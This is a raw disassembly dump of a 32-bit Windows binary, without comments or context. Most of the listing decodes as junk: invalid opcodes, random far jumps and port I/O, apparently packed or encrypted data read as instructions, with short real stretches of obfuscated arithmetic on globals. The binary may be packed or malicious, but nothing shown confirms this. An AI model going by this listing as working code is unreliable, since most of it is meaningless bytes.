  407bcd:	push   cs
  407bce:	pushf  
  407bcf:	fidiv  WORD PTR [edi]
  407bd1:	repnz fcomi st,st(6)
  407bd4:	(bad)  
  407bd5:	jbe    0x407bc6
  407bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd8:	jbe    0x407b73
  407bda:	fs in  al,0x35
  407bdd:	fmul   st,st(7)
  407bdf:	mov    bh,0x48
  407be1:	adc    ecx,DWORD PTR [ebp-0x7ac2df8a]
  407be7:	add    dh,0x4a
  407bea:	and    eax,DWORD PTR [eax-0x3edde0dd]
  407bf0:	mov    al,ds:0xa9e034eb
  407bf5:	aaa    
  407bf6:	std    
  407bf7:	ficom  DWORD PTR [ebp+esi*2-0x76139927]
  407bfe:	fstp   TBYTE PTR [ecx-0x64aba9e8]
  407c04:	dec    ebp
  407c05:	mov    ds:0xb7c405fd,eax
  407c0a:	push   ebp
  407c0b:	out    0x23,al
  407c0d:	push   esp
  407c0e:	pop    es
  407c0f:	out    0x6a,al
  407c11:	mov    ebp,0x23b26868
  407c16:	dec    ecx
  407c17:	aam    0xc3
  407c19:	retf   0xccc0
  407c1c:	ret    0x83fc
  407c1f:	jne    0x407c69
  407c21:	retf   0xd589
  407c24:	arpl   WORD PTR [esi-0x34],di
  407c27:	call   0xb2bf4efc
  407c2c:	fiadd  WORD PTR [edi-0x6c00beb8]
  407c32:	fsubr  DWORD PTR [edi+0x72]
  407c35:	test   al,0xce
  407c37:	imul   DWORD PTR [ebx]
  407c39:	fs push eax
  407c3b:	adc    eax,0xe1fcdb99
  407c40:	cmp    BYTE PTR [esi+0x76],bl
  407c43:	jge    0x407c25
  407c45:	scas   al,BYTE PTR es:[edi]
  407c46:	add    DWORD PTR [eax-0x60850fbd],ecx
  407c4c:	xor    DWORD PTR [eax+edi*4+0x15],0x14
  407c51:	push   cs
  407c52:	rep outs dx,BYTE PTR es:[esi]
  407c55:	sbb    BYTE PTR [esi-0x2c87a7c9],bl
  407c5b:	mov    esi,0xc8c22fd7
  407c60:	fidiv  WORD PTR [bx]
  407c63:	ror    BYTE PTR [ebp+0xc67aa66],cl
  407c69:	aad    0xb3
  407c6b:	std    
  407c6c:	push   ds
  407c6d:	mov    dh,0xc4
  407c6f:	sub    BYTE PTR [edi-0x33],0xe5
  407c73:	dec    eax
  407c74:	cli    
  407c75:	sbb    al,0x76
  407c77:	dec    eax
  407c78:	inc    ebx
  407c79:	aad    0xde
  407c7b:	cwde   
  407c7c:	je     0x407c62
  407c7e:	lods   eax,DWORD PTR ds:[esi]
  407c7f:	(bad)  
  407c81:	lea    eax,[edx-0x6d498207]
  407c87:	xchg   ebp,eax
  407c88:	dec    eax
  407c89:	cld    
  407c8a:	leave  
  407c8b:	pop    es
  407c8c:	mov    fs,ebp
  407c8e:	ja     0x407cd8
  407c90:	aam    0x62
  407c92:	shl    BYTE PTR [eax],1
  407c94:	inc    ebp
  407c95:	rcl    BYTE PTR ds:0x841b52c9,0x46
  407c9c:	push   esi
  407c9d:	inc    ebx
  407c9e:	push   edx
  407c9f:	(bad)  
  407ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca1:	mov    edx,0x97f50b3b
  407ca6:	mov    edx,0x36d0d363
  407cab:	scas   al,BYTE PTR es:[edi]
  407cac:	sub    BYTE PTR [edi-0x55],cl
  407caf:	push   ebx
  407cb0:	dec    ebx
  407cb1:	xchg   DWORD PTR [eax],eax
  407cb3:	dec    edx
  407cb4:	adc    bh,BYTE PTR [esp+eax*2]
  407cb7:	ror    DWORD PTR [eax-0x3cb0b697],0xbf
  407cbe:	les    eax,FWORD PTR [esi+0x1f]
  407cc1:	mov    ecx,0x96b0f999
  407cc6:	clc    
  407cc7:	cdq    
  407cc8:	test   BYTE PTR ds:0x9ea4f14,0x82
  407ccf:	(bad)  
  407cd0:	mov    edx,0x7ce16617
  407cd5:	not    BYTE PTR [ecx]
  407cd7:	jmp    0x15b7:0xbb99918b
  407cde:	(bad)  
  407cdf:	fadd   QWORD PTR [ecx+0x2a]
  407ce2:	jno    0x407cfa
  407ce4:	cld    
  407ce5:	xchg   ebp,eax
  407ce6:	jge    0x407d35
  407ce8:	cli    
  407ce9:	xlat   BYTE PTR ds:[ebx]
  407cea:	and    al,0xd1
  407cec:	enter  0xa00e,0x7b
  407cf0:	dec    ecx
  407cf1:	in     eax,dx
  407cf2:	cs push 0x27b9d69a
  407cf8:	ins    BYTE PTR es:[edi],dx
  407cf9:	mov    ch,bl
  407cfb:	pop    ds
  407cfc:	cmp    dl,ah
  407cfe:	and    DWORD PTR [ecx+0x29],0xffffffbf
  407d02:	mov    ebp,0x41e801d5
  407d07:	sar    BYTE PTR [ecx],1
  407d09:	mov    eax,0xdd2601a0
  407d0e:	sub    BYTE PTR [ebx-0x1e],ch
  407d11:	test   al,0x46
  407d13:	pop    eax
  407d14:	push   esp
  407d15:	mov    al,ds:0xeea4b0a0
  407d1a:	out    0xf7,al
  407d1c:	retf   
  407d1d:	pusha  
  407d1e:	hlt    
  407d1f:	or     ah,cl
  407d21:	jl     0x407d80
  407d23:	int3   
  407d24:	(bad)  
  407d25:	div    bh
  407d27:	test   ch,cl
  407d29:	sub    DWORD PTR [ebx],ebx
  407d2b:	fadd   st,st(4)
  407d2d:	push   edx
  407d2e:	in     al,dx
  407d2f:	repnz popa 
  407d31:	(bad)  
  407d32:	aaa    
  407d33:	jbe    0x407d71
  407d35:	popa   
  407d36:	xor    ecx,DWORD PTR [edi-0x1b]
  407d39:	xor    al,BYTE PTR [edx-0x53b6ac8a]
  407d3f:	cmp    cl,BYTE PTR ds:[ecx]
  407d42:	adc    DWORD PTR [ebp+0x3ca79ec2],eax
  407d48:	shl    DWORD PTR [edi-0x4f],0x25
  407d4c:	in     eax,dx
  407d4d:	arpl   WORD PTR [edx-0x52b4b6cc],bp
  407d53:	icebp  
  407d54:	rcl    DWORD PTR [esi],cl
  407d56:	mov    ebx,0x7ee05ad8
  407d5b:	cld    
  407d5c:	imul   ebp,DWORD PTR [esp+edx*4-0x32],0x5e
  407d61:	je     0x407d8e
  407d63:	sbb    BYTE PTR [edx-0x4f444fd8],al
  407d69:	jmp    0x80b2:0x63b1b1e0
  407d70:	test   BYTE PTR ds:0x16ee309b,0x8
  407d77:	dec    ecx
  407d78:	mov    dh,BYTE PTR [esi-0x4118a65d]
  407d7e:	shr    DWORD PTR [edi],1
  407d80:	das    
  407d81:	daa    
  407d82:	jp     0x407d05
  407d84:	sub    ebx,DWORD PTR [ebp-0x14016479]
  407d8a:	sub    eax,0x283f5fc3
  407d8f:	(bad)  [ebp+0x44]
  407d92:	mov    ds:0x9d18c6a5,eax
  407d97:	outs   dx,DWORD PTR ds:[esi]
  407d98:	out    dx,eax
  407d99:	jno    0x407d24
  407d9b:	inc    edx
  407d9c:	xchg   ecx,eax
  407d9d:	pop    esi
  407d9e:	push   ebp
  407d9f:	xchg   DWORD PTR [esi],esi
  407da1:	clc    
  407da2:	pushf  
  407da3:	mov    ebp,0x39c5e0a6
  407da8:	jbe    0x407de7
  407daa:	pop    esp
  407dab:	shr    DWORD PTR [eax-0x669ac6dd],1
  407db1:	mov    bh,0x49
  407db3:	mov    dl,BYTE PTR [eax+0x578cd35c]
  407db9:	push   es
  407dba:	dec    esi
  407dbb:	add    eax,0x5c80c037
  407dc0:	push   ecx
  407dc1:	pop    eax
  407dc2:	inc    DWORD PTR [ebx-0x51]
  407dc5:	jbe    0x407d4a
  407dc7:	pop    edx
  407dc8:	es xchg esp,eax
  407dca:	test   bl,bl
  407dcc:	xchg   dl,ch
  407dce:	sahf   
  407dcf:	jmp    0x7c16:0x305aba0d
  407dd6:	inc    esi
  407dd7:	ret    0x3ed3
  407dda:	mov    al,0x2
  407ddc:	push   edx
  407ddd:	pop    ebx
  407dde:	inc    ebp
  407ddf:	push   ss
  407de0:	inc    ebx
  407de1:	out    dx,al
  407de2:	clc    
  407de3:	cmp    eax,0x890f5394
  407de8:	jecxz  0x407dea
  407dea:	sub    bl,BYTE PTR [edx]
  407dec:	sbb    ebx,DWORD PTR [esi-0x69]
  407def:	out    dx,eax
  407df0:	cmp    BYTE PTR [ecx],bh
  407df2:	rcl    DWORD PTR [edx+0x6e5b6fa1],1
  407df8:	jne    0x407db9
  407dfa:	push   ss
  407dfb:	jbe    0x407d8c
  407dfd:	sub    eax,0xcb259688
  407e02:	dec    esi
  407e03:	mov    edx,0xc39c8f35
  407e08:	pop    ds
  407e09:	jnp    0x407de7
  407e0b:	lods   eax,DWORD PTR ds:[esi]
  407e0c:	shr    BYTE PTR [ebx],0x41
  407e0f:	je     0x407e04
  407e11:	add    BYTE PTR [ecx],ch
  407e13:	or     ah,BYTE PTR [edx+0x603b30af]
  407e19:	inc    ebp
  407e1a:	adc    dh,BYTE PTR [edx+0x3d]
  407e1d:	aam    0xbf
  407e1f:	jge    0x407e20
  407e21:	xor    dl,dl
  407e23:	adc    eax,0x288d9207
  407e28:	adc    DWORD PTR [ecx],esp
  407e2a:	jb     0x407ddb
  407e2c:	or     eax,0xdafb5c9a
  407e31:	add    al,0x5b
  407e33:	pushf  
  407e34:	adc    edx,DWORD PTR [eax-0x3e17f04]
  407e3a:	pop    ss
  407e3b:	sbb    BYTE PTR [esi],ah
  407e3d:	and    eax,DWORD PTR [edi-0x175fc611]
  407e43:	rcl    BYTE PTR [eax+0xe],cl
  407e46:	or     eax,0x5795d5c
  407e4b:	pop    ebp
  407e4c:	imul   esp,edx,0xffffffae
  407e4f:	loope  0x407e8a
  407e51:	iret   
  407e52:	mul    BYTE PTR [ebp+0x2a5ea1e6]
  407e58:	in     eax,0x17
  407e5a:	out    dx,eax
  407e5b:	sahf   
  407e5c:	call   0x3621d69d
  407e61:	or     al,BYTE PTR [ebp+ecx*2+0x61]
  407e65:	repnz cmp al,0x80
  407e68:	mov    dh,BYTE PTR [esi+esi*2-0x4a]
  407e6c:	sti    
  407e6d:	adc    BYTE PTR ds:0x47b8b060,al
  407e73:	out    dx,eax
  407e74:	test   BYTE PTR [eax],cl
  407e76:	enter  0xb3bc,0x74
  407e7a:	out    0x7e,eax
  407e7c:	mov    al,ds:0xd4061d32
  407e81:	ins    BYTE PTR es:[edi],dx
  407e82:	pushf  
  407e83:	pop    ecx
  407e84:	fisttp WORD PTR cs:[ebp-0x53]
  407e88:	pop    ds
  407e89:	imul   esi,DWORD PTR [eax-0x5bbc631e],0x3c0ddd66
  407e93:	std    
  407e94:	arpl   WORD PTR [edx-0x7564aa20],sp
  407e9a:	push   cs
  407e9b:	retf   0x7ca4
  407e9e:	sub    eax,0x3ebeeb02
  407ea3:	call   0xdf0f:0xacab171d
  407eaa:	pop    ebx
  407eab:	mov    fs,esp
  407ead:	xchg   edx,eax
  407eae:	enter  0x145e,0x99
  407eb2:	pop    es
  407eb3:	jbe    0x407eb6
  407eb5:	call   DWORD PTR [ebx]
  407eb7:	dec    esi
  407eb8:	add    eax,0x4ab419ef
  407ebd:	push   esp
  407ebe:	mov    ebp,0xed23d2a0
  407ec3:	dec    edx
  407ec4:	and    BYTE PTR [ebx],cl
  407ec6:	xchg   esi,eax
  407ec7:	jle    0x407eb0
  407ec9:	int3   
  407eca:	add    ah,BYTE PTR [ebx-0xf]
  407ecd:	fistp  DWORD PTR [ecx-0x3c]
  407ed0:	adc    BYTE PTR [edi],0x2a
  407ed3:	sbb    BYTE PTR [ecx],bl
  407ed5:	mov    ds:0xe7704d02,al
  407eda:	scas   al,BYTE PTR es:[edi]
  407edb:	inc    edx
  407edc:	dec    esp
  407edd:	dec    edx
  407ede:	mov    ds:0x7581d8a4,al
  407ee3:	cld    
  407ee4:	mov    eax,0x660e149e
  407ee9:	mov    eax,DWORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	push   ds
  407f1e:	mov    bl,0x6d
  407f20:	scas   al,BYTE PTR es:[edi]
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	fwait
  407f2a:	jmp    0x407ebc
  407f2c:	dec    ecx
  407f2d:	mov    ds:0xff27bb4,eax
  407f32:	aas    
  407f33:	ss pop esp
  407f35:	mov    bl,0x78
  407f37:	xchg   edi,eax
  407f38:	pusha  
  407f39:	push   ebp
  407f3a:	fisttp QWORD PTR [ebx-0x1c]
  407f3d:	out    dx,eax
  407f3e:	push   cs
  407f3f:	(bad)  
  407f40:	enter  0x590e,0x5d
  407f44:	add    bh,ah
  407f46:	add    BYTE PTR [edi],al
  407f48:	sbb    esp,DWORD PTR [ecx]
  407f4a:	cmc    
  407f4b:	or     ecx,DWORD PTR [edx-0x3a]
  407f4e:	and    dh,ch
  407f50:	test   BYTE PTR [esi+0x2ba0a1f4],bl
  407f56:	pushf  
  407f57:	sbb    DWORD PTR [esi+0x77],0xffffff81
  407f5b:	xor    bh,bh
  407f5d:	add    al,0xef
  407f5f:	pushf  
  407f60:	outs   dx,DWORD PTR ds:[esi]
  407f61:	imul   edx,DWORD PTR [ebx+0x59],0x208bd025
  407f68:	xor    edx,DWORD PTR [ebp-0x10a05f88]
  407f6e:	imul   ebp,DWORD PTR [eax],0x7e
  407f71:	xor    edx,DWORD PTR [ecx]
  407f73:	jae    0x407f7e
  407f75:	push   0xffffffcd
  407f77:	mov    ecx,0xf98b9084
  407f7c:	leave  
  407f7d:	sahf   
  407f7e:	std    
  407f7f:	lahf   
  407f80:	mov    ebx,0xf924e706
  407f85:	daa    
  407f86:	cli    
  407f87:	cmp    ah,dh
  407f89:	pop    esp
  407f8a:	push   edx
  407f8b:	pop    ss
  407f8c:	pusha  
  407f8d:	dec    esp
  407f8e:	mov    bh,0x46
  407f90:	int3   
  407f91:	imul   DWORD PTR [edx]
  407f93:	aas    
  407f94:	fild   DWORD PTR [ebp-0x3afdaed8]
  407f9a:	mov    cl,BYTE PTR [edx]
  407f9c:	(bad)  
  407f9d:	lahf   
  407f9e:	fsubr  DWORD PTR [ebx+0x527aa1b6]
  407fa4:	xchg   esi,eax
  407fa5:	mov    ah,0x3e
  407fa7:	xchg   esp,eax
  407fa8:	jns    0x407f7e
  407faa:	push   ebp
  407fab:	jmp    0xf578:0x37321d8f
  407fb2:	stos   BYTE PTR es:[edi],al
  407fb3:	xor    DWORD PTR [esp+edx*4+0x1c],ebx
  407fb7:	lods   eax,DWORD PTR ds:[esi]
  407fb8:	and    eax,0xc10a2b17
  407fbd:	lock fdiv DWORD PTR [ecx+0x40]
  407fc1:	cmc    
  407fc2:	cmp    BYTE PTR [edi],0xb0
  407fc5:	repnz imul ebx,edx,0x61186c82
  407fcc:	sub    eax,0xc6c27608
  407fd1:	cmp    esp,ebx
  407fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd4:	mov    esp,0xd68c94a7
  407fd9:	dec    ecx
  407fda:	jl     0x407f91
  407fdc:	xchg   DWORD PTR [edx],ebx
  407fde:	adc    ebp,edx
  407fe0:	rcl    BYTE PTR [ebx],cl
  407fe2:	jb     0x407fa2
  407fe4:	sar    ecx,cl
  407fe6:	iret   
  407fe7:	addr16 mov edx,0x71ea91af
  407fed:	retf   
  407fee:	sahf   
  407fef:	inc    edx
  407ff0:	mov    eax,ds:0x8bb59b62
  407ff5:	xor    al,0xf4
  407ff7:	pushf  
  407ff8:	jmp    0xa11af6c9
  407ffd:	loopne 0x407fb6
  407fff:	xchg   ebp,eax
  408000:	fs mov dh,0xf3
  408003:	cmp    eax,0x47dc78e1
  408008:	inc    edx
  408009:	sub    DWORD PTR [edi],ecx
  40800b:	and    eax,0xdc6cd50e
  408010:	mov    esp,0x5d72436a
  408015:	mov    esi,0x8a41f959
  40801a:	clc    
  40801b:	ror    BYTE PTR [ecx],0x89
  40801e:	pop    es
  40801f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408020:	xlat   BYTE PTR ds:[ebx]
  408021:	sbb    eax,DWORD PTR [ebx+0x2df832fc]
  408027:	push   edx
  408028:	push   ebp
  408029:	mov    bl,0x0
  40802b:	jl     0x4080a5
  40802d:	cli    
  40802e:	ret    0xded1
  408031:	dec    esp
  408032:	das    
  408033:	mov    esp,0xc27c30e1
  408038:	imul   ecx,DWORD PTR [ecx],0x37
  40803b:	imul   edi,DWORD PTR ds:0xe37a8511,0xffffff80
  408042:	pop    esi
  408043:	push   eax
  408044:	sbb    ecx,DWORD PTR [edx+0x50]
  408047:	test   al,0xf8
  408049:	jg     0x40804a
  40804b:	in     eax,dx
  40804c:	push   edi
  40804d:	adc    eax,0xbfa1e45d
  408052:	mov    ?,WORD PTR [ebx-0xc]
  408055:	inc    ecx
  408056:	adc    DWORD PTR [esp+esi*4-0x40],eax
  40805a:	pop    ds
  40805b:	jbe    0x40806b
  40805d:	mov    cl,0x21
  40805f:	inc    esp
  408060:	jge    0x408027
  408062:	lock ss mov ecx,0x9e6305be
  408069:	cmp    esi,DWORD PTR [ecx+ebp*2+0x37]
  40806d:	dec    ebx
  40806e:	pop    edi
  40806f:	push   esp
  408070:	or     DWORD PTR [ebp+eiz*8+0x74b17154],ecx
  408077:	pop    es
  408078:	call   0x867028ad
  40807d:	ror    DWORD PTR [ebp+0x1f],cl
  408080:	mov    al,ds:0x34015a53
  408085:	push   eax
  408086:	js     0x4080db
  408088:	dec    esi
  408089:	pop    ds
  40808a:	sbb    ch,BYTE PTR ds:0x605b84fc
  408090:	mov    cl,0x4e
  408092:	imul   eax,edi,0x8532f845
  408098:	pushf  
  408099:	clc    
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0xcdcc1e8b
  40818c:	call   DWORD PTR [eax-0x1b818129]
  408192:	jg     0x408212
  408194:	jle    0x408203
  408196:	(bad)  
  408197:	aam    0xfd
  408199:	inc    edx
  40819a:	icebp  
  40819b:	cmp    al,0x2c
  40819d:	shr    al,0x3d
  4081a0:	mov    dl,0xb5
  4081a2:	jo     0x4081a3
  4081a4:	or     eax,0x66efc7ae
  4081a9:	sub    al,BYTE PTR [esi]
  4081ab:	ret    0xaf04
  4081ae:	dec    edi
  4081af:	rcl    BYTE PTR [ebp+0x77],cl
  4081b2:	jp     0x408190
  4081b4:	gs in  al,dx
  4081b6:	mov    al,ds:0x769f40f
  4081bb:	or     eax,0xaeae2eba
  4081c0:	test   al,0x63
  4081c2:	xor    eax,0xebc6938d
  4081c7:	cmp    DWORD PTR [esi],ecx
  4081c9:	test   DWORD PTR [ebx],ecx
  4081cb:	xor    ah,BYTE PTR [ecx+0xf]
  4081ce:	mov    esi,0x4a1bbdf8
  4081d3:	jno    0x4081c7
  4081d5:	xor    ah,BYTE PTR [esi-0x13c8169e]
  4081db:	fst    QWORD PTR ds:0x658e9358
  4081e1:	dec    edx
  4081e2:	lea    ebx,[edx-0x61]
  4081e5:	ins    BYTE PTR es:[edi],dx
  4081e6:	jno    0x408168
  4081e8:	push   ds
  4081e9:	test   BYTE PTR [eax-0x47],ch
  4081ec:	or     esi,DWORD PTR [ebp+0x1e]
  4081ef:	ins    DWORD PTR es:[edi],dx
  4081f0:	inc    esp
  4081f1:	(bad)  
  4081f2:	dec    esp
  4081f3:	inc    edi
  4081f4:	pop    edi
  4081f5:	inc    esi
  4081f6:	ins    BYTE PTR es:[edi],dx
  4081f7:	int3   
  4081f8:	mov    eax,ds:0xd5e9aa6d
  4081fd:	ins    BYTE PTR es:[edi],dx
  4081fe:	(bad)  
  4081ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408200:	sub    ebp,esp
  408202:	sbb    dl,BYTE PTR [eax+0x3b]
  408205:	inc    ecx
  408206:	pop    ecx
  408207:	hlt    
  408208:	mov    ebp,0x3887f173
  40820d:	out    0xbb,al
  40820f:	and    DWORD PTR [ebx+0x17],0x43dc195d
  408216:	int    0x47
  408218:	lds    eax,FWORD PTR [edx+0x6b8a2560]
  40821e:	in     al,dx
  40821f:	(bad)  
  408221:	sbb    BYTE PTR [edx+0x9],al
  408224:	pop    esi
  408225:	mov    edx,0xf543d6fb
  40822a:	loope  0x408203
  40822c:	(bad)  
  40822d:	push   0xdffcbd25
  408232:	popa   
  408233:	adc    esp,DWORD PTR [esi+0x1e]
  408236:	pop    esi
  408237:	jae    0x4081db
  408239:	push   ss
  40823a:	cmp    cl,BYTE PTR [ecx]
  40823c:	(bad)  
  40823d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40823e:	cli    
  40823f:	pop    eax
  408240:	and    al,al
  408242:	imul   esp,DWORD PTR [esi*1+0xd532773],0xffffffba
  40824a:	mov    ds:0x43e8d35c,eax
  40824f:	or     al,0xb4
  408251:	cmp    BYTE PTR [esi],al
  408253:	sbb    DWORD PTR [ebp-0x315c3084],ecx
  408259:	test   al,0xb6
  40825b:	test   al,0xa7
  40825d:	sub    eax,0x23518b88
  408262:	imul   ebx,ebp,0xffffffdb
  408265:	(bad)  
  408266:	sub    al,0xdb
  408268:	mov    ebp,0x67f914ad
  40826d:	or     al,0xd5
  40826f:	sub    DWORD PTR [edx+ebx*4],esp
  408272:	xor    BYTE PTR [ebx],ah
  408274:	add    ecx,eax
  408276:	xchg   esi,eax
  408277:	iret   
  408278:	ja     0x408245
  40827a:	mov    eax,0x95dc10a3
  40827f:	xchg   BYTE PTR [edx+0x58138078],dh
  408285:	(bad)  
  408286:	cmp    eax,0x127d5bb4
  40828b:	jl     0x408295
  40828d:	xor    eax,0x36e61c8f
  408292:	add    BYTE PTR [ecx],0x37
  408295:	mov    ebp,0x4d0002cd
  40829a:	mov    dh,0x4d
  40829c:	outs   dx,BYTE PTR ds:[esi]
  40829d:	int3   
  40829e:	aas    
  40829f:	mov    ebp,0xe1d6cb77
  4082a4:	lods   al,BYTE PTR ds:[esi]
  4082a5:	or     dh,BYTE PTR [edi-0x54]
  4082a8:	mov    al,0x82
  4082aa:	push   edx
  4082ab:	xor    eax,0xc707121
  4082b0:	xchg   DWORD PTR [edi],ebx
  4082b2:	jecxz  0x408312
  4082b4:	jae    0x4082bf
  4082b6:	mov    ebp,0xb811cab1
  4082bb:	inc    ecx
  4082bc:	clc    
  4082bd:	aam    0x7f
  4082bf:	pop    ss
  4082c0:	mov    dl,0x18
  4082c2:	test   BYTE PTR [esi],al
  4082c4:	jp     0x408319
  4082c6:	push   ebp
  4082c7:	and    cl,bl
  4082c9:	mov    al,0x60
  4082cb:	fst    DWORD PTR ds:0xfd8c240b
  4082d1:	jns    0x408261
  4082d3:	repz xchg esi,eax
  4082d5:	icebp  
  4082d6:	adc    al,0x11
  4082d8:	push   cs
  4082d9:	pop    edi
  4082da:	shr    DWORD PTR [ebx-0x3c],0xbd
  4082de:	lods   al,BYTE PTR ds:[esi]
  4082df:	stos   BYTE PTR es:[edi],al
  4082e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082e1:	cmp    ebp,edx
  4082e3:	outs   dx,BYTE PTR ds:[esi]
  4082e4:	mov    ecx,0xc656959d
  4082e9:	gs sub ebx,eax
  4082ec:	call   0xa91e:0xfcf082b3
  4082f3:	mov    al,BYTE PTR [ebx-0x53]
  4082f6:	pop    edx
  4082f7:	mov    dl,0x30
  4082f9:	imul   ebp,DWORD PTR ds:0x9040eb0a,0x2581c133
  408303:	jg     0x40833c
  408305:	inc    ebx
  408306:	add    BYTE PTR [eax+0x13],dh
  408309:	add    BYTE PTR [eax],al
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x44d93fa0
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x4083e2
  40838a:	ret    0xb89c
  40838d:	push   ebx
  40838e:	jne    0x4083f1
  408390:	sbb    BYTE PTR [edi-0x2a2a5d11],ch
  408396:	dec    edx
  408397:	clc    
  408398:	mov    ?,WORD PTR [ebx+edi*4-0x29]
  40839c:	cmc    
  40839d:	dec    esi
  40839e:	ins    BYTE PTR es:[edi],dx
  40839f:	shr    DWORD PTR [ebx+0x611d6eb5],cl
  4083a5:	pop    edi
  4083a6:	not    ch
  4083a8:	ja     0x408334
  4083aa:	out    0x24,al
  4083ac:	lds    ebp,FWORD PTR [edx-0x1a33fc4c]
  4083b2:	sub    al,0xa5
  4083b4:	mov    cl,0xa8
  4083b6:	(bad)  
  4083b9:	or     dl,BYTE PTR [edx]
  4083bb:	test   DWORD PTR [ecx],edi
  4083bd:	inc    esi
  4083be:	xchg   bl,ah
  4083c0:	xor    ah,BYTE PTR [esi-0x35]
  4083c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083c4:	mov    eax,ds:0xeef2335b
  4083c9:	cwde   
  4083ca:	jns    0x4083a1
  4083cc:	and    DWORD PTR [edx+0x316a0881],edi
  4083d2:	int3   
  4083d3:	jmp    0xee957a3a
  4083d8:	push   esi
  4083d9:	jno    0x4083a1
  4083db:	xor    al,0xef
  4083dd:	xchg   edi,eax
  4083de:	(bad)  
  4083e0:	imul   ecx,DWORD PTR ds:0x3a07df1e,0xffffff86
  4083e7:	outs   dx,BYTE PTR ds:[esi]
  4083e8:	repz push ebx
  4083ea:	jno    0x408421
  4083ec:	jl     0x408425
  4083ee:	and    al,0x80
  4083f0:	inc    ebx
  4083f1:	pop    ebp
  4083f2:	xor    ebx,eax
  4083f4:	nop
  4083f5:	repz mov ds:0x14d3f880,al
  4083fb:	mov    BYTE PTR [esi+edx*4-0x2c2790a0],ch
  408402:	bound  edi,QWORD PTR [edi-0x30]
  408405:	mov    bh,0x23
  408407:	add    ah,ah
  408409:	cmp    eax,DWORD PTR [ecx-0x18]
  40840c:	es cs pop ss
  40840f:	sti    
  408410:	xor    eax,0x8088a3a1
  408415:	sub    ah,dh
  408417:	cmp    esi,DWORD PTR [edx+0x7b7cc32d]
  40841d:	xor    BYTE PTR [esi-0xecbe922],dl
  408423:	stc    
